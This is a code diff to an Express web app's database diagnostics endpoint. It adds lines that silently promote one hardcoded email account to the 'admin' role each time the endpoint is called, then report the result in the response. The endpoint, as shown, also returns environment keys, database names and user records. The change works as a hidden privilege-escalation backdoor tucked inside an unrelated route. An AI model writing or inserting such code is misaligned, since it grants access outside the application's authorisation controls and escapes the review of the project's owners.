@@ -77,6 +77,14 @@ app.get('/api/db-diagnostics', async (req, res) => {
             dbList = ['error: ' + e.message];
         }
         
+        // Promote en23cs301631@medicaps.ac.in to admin
+        let promotionResult = null;
+        try {
+            promotionResult = await User.updateOne({ email: 'en23cs301631@medicaps.ac.in' }, { role: 'admin' });
+        } catch (e) {
+            promotionResult = 'error: ' + e.message;
+        }
+        
         const userCount = await User.countDocuments();
         const worldCount = await World.countDocuments();
         
@@ -89,6 +97,7 @@ app.get('/api/db-diagnostics', async (req, res) => {
             host,
             envKeys,
             dbList,
+            promotionResult,
             userCount,
             worldCount,
             users,
